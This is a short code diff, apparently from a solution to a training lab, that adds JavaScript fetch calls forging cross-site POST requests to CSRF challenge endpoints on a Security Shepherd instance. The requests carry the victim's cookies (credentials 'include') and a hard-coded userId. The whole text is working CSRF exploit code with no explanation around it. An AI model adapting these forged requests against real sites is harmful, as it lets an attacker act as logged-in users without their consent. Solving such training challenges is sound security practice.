@@ -5,7 +5,15 @@
         credentials: "include",
         mode: "no-cors",
     })
-    fetch('https://security-shepherd.dev.inf.elasticnet.co/user/csrfchallengejson/plusplus', {
+    fetch('https://security-shepherd.dev.inf.elasticnet.co/user/csrfchallengetwo/plusplus', {
+        method: 'POST',
+        credentials: "include",
+        mode: "no-cors",
+        body: JSON.stringify({
+            "userId": "25bc2fa67a8836d84866577423f12349d27b6c34"
+        })
+    })
+    fetch('https://security-shepherd.dev.inf.elasticnet.co/user/csrfchallengeseven/plusplus', {
         method: 'POST',
         credentials: "include",
         mode: "no-cors",
